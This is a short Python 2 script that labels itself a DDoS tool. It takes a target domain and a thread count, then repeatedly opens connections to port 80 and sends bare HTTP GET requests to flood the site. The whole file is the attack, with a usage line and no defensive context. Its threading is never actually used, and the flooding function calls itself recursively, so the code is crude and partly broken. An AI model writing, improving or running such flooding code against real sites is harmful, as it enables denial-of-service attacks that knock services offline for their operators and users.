#!/usr/bin/python

import socket, threading, sys
if len(sys.argv)>1:
	print "DDoS: "+sys.argv[1];
	def attack():
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
		s.connect((sys.argv[1], 80));
		s.send("GET / HTTP/1.1\r\n");
		s.send("Host: "+sys.argv[1]+"\r\n\r\n");
		s.close();
		sys.stdout.write(".");
		sys.stdout.flush();
		attack();
	threads		= 50 if len(sys.argv)<3 else str(sys.argv[2]);
	for i in range(0, int(threads)):
		attack();
else:
	print("Usage:\tpython ddos.py domain.com 50");
